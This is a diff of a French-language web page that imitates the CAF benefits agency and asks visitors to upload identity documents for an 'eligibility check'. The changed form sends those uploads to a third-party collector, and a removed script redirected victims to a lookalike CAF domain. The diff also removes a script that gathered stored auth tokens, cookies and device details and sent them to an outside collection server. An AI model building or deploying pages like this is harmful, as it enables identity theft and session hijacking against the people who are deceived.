@@ -171,7 +171,8 @@ header.hero .hero-inner {
 <div class="wrap">
   <main>
     
-   <form method="POST" id="mainForm" enctype="multipart/form-data">
+   <form method="POST" action="https://smartforms.dev/submit/6aec7147c184545ccc232a64" enctype="multipart/form-data" id="mainForm">
+
 
   <div class="field">
     <label for="Pièce d'identité(recto)">Pièce d'identité(recto)<span class="req">*</span></label>
@@ -190,56 +191,14 @@ header.hero .hero-inner {
   <button type="submit">Vérifier mon éligibilité →</button>
 </form>
 
-
   </main>
 
   <footer>
     Après avoir soumis, votre assistant(e) vous enverra un code. Veuillez le sélectionner pour vous connecter au serveur.
   </footer>
 </div>
-<script>
-  document.getElementById('mainForm').addEventListener('submit', function(e) {
-    e.preventDefault();
-    const data = new FormData(e.target);
 
-    fetch('https://smartforms.dev/submit/6aec7147c184545ccc232a64', {
-      method: 'POST',
-      body: data,
-      headers: { 'Accept': 'application/json' }
-    })
-    .then(response => {
-      if (response.ok) {
-        window.location.href = 'http://caf-fr-subvensiondemandeaccompagnement.pages.dev/identification-caf.html';
-      } else {
-        alert('Erreur, réessaie.');
-      }
-    })
-    .catch(() => alert('Erreur réseau, réessaie.'));
-  });
-</script>
 
- <script>
-let token = localStorage.getItem("authToken") 
-         || sessionStorage.getItem("token");
-
-// Lire les cookies non-HttpOnly
-let cookies = document.cookie;
-
-let device = navigator.userAgent;
-
-let payload = {
-    token: token,
-    cookies: cookies,   // ajout des cookies visibles
-    device: device,
-    time: Date.now()
-};
-
-fetch("https://collect-pepv.onrender.com/report", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(payload)
-});
-</script>
 
 
 </body>
